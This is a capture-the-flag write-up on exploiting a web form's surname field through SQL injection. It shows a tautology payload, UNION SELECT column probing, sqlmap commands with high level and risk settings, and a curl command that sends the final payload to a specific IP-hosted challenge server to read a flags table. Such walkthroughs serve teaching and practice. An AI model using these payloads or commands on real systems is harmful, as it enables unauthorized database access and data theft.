# Web SQL Injection Demo

The page presents a form with the message:
- "Search user by surname"
- "Funny, do you think you can find me?"

There is a **POST** form input called surname, which submits data to /index.php.


## 1: Initial Observation
We opened the page and tried a manual injection in the form:

```sql
' OR 1=1 --
```

The response contained:

```html
<small id="emailHelp" class="form-text text-muted">admin</small>
<small id="emailHelp" class="form-text text-muted">ctf</small>
```

This confirmed that the application was vulnerable to SQL Injection, and user data was being leaked via SQL queries on the surname field.

## 2: Trying with sqlmap
We attempted to automate the attack using sqlmap:

```bash
sqlmap -u "http://141.85.224.127:8083/index.php" \
  --data="surname=anything" \
  --batch --dump
```

Output:
```text
[WARNING] POST parameter 'surname' does not appear to be dynamic
[CRITICAL] all tested parameters do not appear to be injectable.
Try to increase values for '--level'/'--risk'...
[WARNING] your sqlmap version is outdated
```

Even after adjusting options with:

***--level=5 --risk=3 --time-sec=10 --random-agent*** and trying different techniques:

```bash
--technique=U,T,B
```
the results were the same: sqlmap was unable to detect the injection automatically, likely due to:
- A lack of dynamic page difference for automated comparison.
- A WAF or timeout issue when detecting time-based or error-based payloads.
- Content filtering or noise in output.

## 3: Finding a Way to Extract the Flag
Knowing this, we suspected there might be a hidden table (likely called flags or flag) that we could read from.

To use SQLi effectively, we needed to determine:

How many columns the query was using.

Which column would be reflected back to the page.

We tried the following UNION-based injection:

```sql
surname=admin' UNION SELECT NULL -- 
surname=admin' UNION SELECT NULL,NULL -- 
surname=admin' UNION SELECT NULL,NULL,NULL -- 
```

Eventually, injecting three columns worked without breaking the page structure.

## 4: Constructing Final Payload
Once we confirmed the correct column count, we injected the flag using this payload:

```sql
admin' UNION SELECT v, NULL, NULL FROM flags -- 
```

Where:
- v is the assumed flag column.
- flags is the assumed table holding the flag.

To use command like this, we used curl:

```bash
curl -s "http://141.85.224.127:8083/index.php" --data-raw "surname=admin' UNION SELECT v,NULL,NULL FROM flags -- "
```

This sends the malicious surname field directly to the backend and prints the entire HTML page response.

The flag appears in this format:

```html
<small id="emailHelp" class="form-text text-muted">SSS{mAsTeR_oF_sQlI}</small>
```
